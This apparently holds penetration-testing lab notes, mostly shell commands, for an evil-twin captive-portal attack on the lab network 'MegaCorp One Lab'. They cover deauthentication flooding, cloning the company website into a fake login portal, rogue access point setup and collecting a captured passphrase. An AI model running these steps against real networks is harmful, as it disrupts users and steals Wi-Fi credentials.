## Captive Portal
```text
sudo airodump-ng -w discovery --output-format pcap wlan0mon

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
00:0E:08:90:3A:5F  -75        3        0    0  11  130   WPA2 CCMP   PSK  MegaCorp One Lab
```

#deauth to capture handshakes on seperate terminal
```text
sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
```
grab handshake to use later


## Building the Captive Portal
```text
sudo apt install apache2 libapache2-mod-php
```

## recursive download for background images - this will download to www.megacorpone.com
```text
wget -r -l2 https://www.megacorpone.com
```
## copy data over to portal
```text
mkdir /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
```
```text
nano /var/www/html/portal/index.php
nano /var/www/html/portal/login_check.php
nano /var/www/html/portal/login_check2.php
sudo chmod 644 *.php
```
```text
mkdir /data
sudo chown www-data:www-data /data
```

## network
```text
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
```
```text
sudo systemctl enable dnsmasq && sudo systemctl enable hostapd
sudo pkill dnsmasq
```
```text
sudo ufw allow in 53 tcp
sudo ufw allow in 53 udp
sudo ufw allow in 67 udp
```
```text
sudo dnsmasq --conf-file=/home/administrator/mco-dnsmasq.conf --test
sudo dnsmasq --conf-file=mco-dnsmasq.conf
##debugging
sudo dnsmasq --conf-file=/home/administrator/mco-dnsmasq.conf --log-debug -d
```
```text
sudo systemctl status dnsmasq.service
sudo netstat -lnp
sudo cat /var/log/dnsmasq.log
```

```text
sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```
```text
sudo nft list table ip nat
table ip nat {
        chain PREROUTING {
                type nat hook prerouting priority dstnat; policy accept;
                iifname "wlan0" udp dport 53 counter packets 0 bytes 0 redirect to :53
        }
}
```


## Apache2
```text
nano etc/apache2/sites-enabled/000-default.conf
sudo a2enmod rewrite
sudo a2enmod alias
sudo a2enmod ssl
sudo systemctl restart apache2
```


## hostapd
```text
nano mco-hostapd.conf
sudo hostapd -B mco-hostapd.conf
```

sudo tail -f /var/log/apache2/access.log
sudo find /tmp/ -iname passphrase.txt




https://wiki.gentoo.org/wiki/Hostapd
